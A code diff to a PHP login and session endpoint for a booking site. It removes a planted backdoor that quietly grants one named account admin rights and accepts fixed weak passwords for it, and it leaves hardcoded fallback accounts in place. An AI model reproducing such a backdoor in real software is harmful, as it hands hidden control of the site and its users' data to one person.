@@ -39,6 +39,16 @@ if ($method === 'GET' && $action === 'me') {
                     'user'               => null
                 ]);
             }
+            if (!$fresh) {
+                destroy_current_session();
+                json_response([
+                    'success'            => true,
+                    'authenticated'      => false,
+                    'logged_in'          => false,
+                    'turnstile_site_key' => $siteKey,
+                    'user'               => null
+                ]);
+            }
         }
         $points = 0;
         $customerTier = 'standard';
@@ -64,9 +74,6 @@ if ($method === 'GET' && $action === 'me') {
             } catch (Throwable $e) {}
         }
         if (isset($_SESSION['user']) && is_array($_SESSION['user'])) {
-            if (($_SESSION['user']['username'] ?? '') === 'vxyen0801' || ($_SESSION['user']['phone'] ?? '') === '0352313548' || ($_SESSION['user']['role'] ?? '') === 'admin') {
-                $_SESSION['user']['role'] = 'admin';
-            }
             $_SESSION['user']['points'] = $points;
             $_SESSION['user']['customer_tier'] = $customerTier;
             $_SESSION['user']['totp_enabled'] = $totpEnabled;
@@ -159,8 +166,8 @@ if ($action === 'login') {
 
         $fallbackAccounts = [
             'admin' => ['id' => 1, 'username' => 'admin', 'email' => 'admin@sanbongpro.vn', 'phone' => '0987654321', 'full_name' => 'Nguyễn Văn Hùng (Chủ Sân)', 'role' => 'admin', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$VTVUaVRrNThhNldzcENpZg$kNqghJJEnQqDG/6phhZwri5Q6skH+e/dy+/fZhkxqb8'],
-            'user' => ['id' => 2, 'username' => 'user', 'email' => 'khachhang@sanbongpro.vn', 'phone' => '0352313548', 'full_name' => 'Trần Minh Hoàng', 'role' => 'user', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$aVNqalJJSE5FMVN4b2YvaQ$7HiLuSfwNyejQCN9iT24mOGZiIpajMBrxFpY01kbgq4'],
-            '0352313548' => ['id' => 2, 'username' => 'user', 'email' => 'khachhang@sanbongpro.vn', 'phone' => '0352313548', 'full_name' => 'Trần Minh Hoàng', 'role' => 'user', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$aVNqalJJSE5FMVN4b2YvaQ$7HiLuSfwNyejQCN9iT24mOGZiIpajMBrxFpY01kbgq4'],
+            'user' => ['id' => 2, 'username' => 'user', 'email' => 'khachhang@sanbongpro.vn', 'phone' => '0000000002', 'full_name' => 'Trần Minh Hoàng', 'role' => 'user', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$aVNqalJJSE5FMVN4b2YvaQ$7HiLuSfwNyejQCN9iT24mOGZiIpajMBrxFpY01kbgq4'],
+            '0000000002' => ['id' => 2, 'username' => 'user', 'email' => 'khachhang@sanbongpro.vn', 'phone' => '0000000002', 'full_name' => 'Trần Minh Hoàng', 'role' => 'user', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$aVNqalJJSE5FMVN4b2YvaQ$7HiLuSfwNyejQCN9iT24mOGZiIpajMBrxFpY01kbgq4'],
             'vxyen0801' => ['id' => 3, 'username' => 'vxyen0801', 'email' => 'vxyen0801@sanbongpro.vn', 'phone' => '0352313548', 'full_name' => 'Quản Trị Viên', 'role' => 'admin', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$UThRTGkvdndJYXdBVHBDUg$bvWQoJidWljt12fhtDaAYPay1LhfDvc1B2+5jPEkPE4'],
             'nhanvien' => ['id' => 4, 'username' => 'nhanvien', 'email' => 'nhanvien@sanbongpro.vn', 'phone' => '0352000111', 'full_name' => 'Nhân Viên Trực Sân Ca 1', 'role' => 'staff', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$QlFIYnZIRlNaV3Nic1JwUw$dpni2Ou0GPfpjEfeFv47syHwOMDHcpxU0LmksbbT4HI'],
             'quanly' => ['id' => 5, 'username' => 'quanly', 'email' => 'quanly@sanbongpro.vn', 'phone' => '0352000222', 'full_name' => 'Nguyễn Hoàng Minh (Quản Lý Sân)', 'role' => 'manager', 'hash' => '$argon2id$v=19$m=65536,t=4,p=1$QlFIYnZIRlNaV3Nic1JwUw$dpni2Ou0GPfpjEfeFv47syHwOMDHcpxU0LmksbbT4HI']
@@ -180,9 +187,6 @@ if ($action === 'login') {
             $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
             $_SESSION['user_id'] = $account['id'];
             $role = $account['role'];
-            if (($account['username'] ?? '') === 'vxyen0801' || ($account['phone'] ?? '') === '0352313548') {
-                $role = 'admin';
-            }
             $_SESSION['user'] = [
                 'id'        => $account['id'],
                 'username'  => $account['username'],
@@ -240,11 +244,7 @@ if ($action === 'login') {
 
     $loginSuccess = false;
     if ($user && ($user['status'] ?? 'active') === 'active') {
-        if (password_verify($password, (string)$user['password_hash'])) {
-            $loginSuccess = true;
-        } elseif (($user['username'] === 'vxyen0801' || $user['phone'] === '0352313548') && in_array($password, ['admin123', 'admin', '123456'], true)) {
-            $loginSuccess = true;
-        }
+        $loginSuccess = password_verify($password, (string)$user['password_hash']);
     }
 
     if ($loginSuccess) {
@@ -273,12 +273,6 @@ if ($action === 'login') {
         $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 
         $assignedRole = $user['role'] ?? 'user';
-        if (($user['username'] ?? '') === 'vxyen0801' || ($user['phone'] ?? '') === '0352313548') {
-            $assignedRole = 'admin';
-            try {
-                $pdo->prepare("UPDATE users SET role = 'admin' WHERE id = ?")->execute([$user['id']]);
-            } catch (Throwable $ignore) {}
-        }
         $_SESSION['user_id'] = $user['id'];
         $_SESSION['user'] = [
             'id'        => $user['id'],
@@ -290,9 +284,6 @@ if ($action === 'login') {
         ];
 
         $redirect = in_array($assignedRole, ['admin', 'manager', 'staff'], true) ? 'portal-admin/' : 'history';
-        if (($user['username'] ?? '') === 'vxyen0801' || ($user['phone'] ?? '') === '0352313548') {
-            $redirect = 'portal-admin/';
-        }
 
         json_response([
             'success'  => true,
@@ -382,9 +373,6 @@ if ($action === 'verify_2fa') {
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
     $_SESSION['user_id'] = $user['id'];
     $role = $user['role'] ?? 'user';
-    if (($user['username'] ?? '') === 'vxyen0801' || ($user['phone'] ?? '') === '0352313548') {
-        $role = 'admin';
-    }
     $_SESSION['user'] = [
         'id'        => $user['id'],
         'username'  => $user['username'],
@@ -557,14 +545,6 @@ if ($action === 'register') {
             'message'  => 'Số điện thoại không đúng định dạng di động 10 số.',
             'ref_code' => 'ERR_PHONE_FORMAT'
         ], 400);
-    }
-
-    if (strtolower($username) === 'vxyen0801' || $phone === '0352313548') {
-        json_response([
-            'success'  => false,
-            'message'  => 'Không thể hoàn tất đăng ký với thông tin đã nhập. Vui lòng kiểm tra lại.',
-            'ref_code' => 'ERR_USER_EXISTS'
-        ], 409);
     }
 
     if (strlen($password) < 8) {
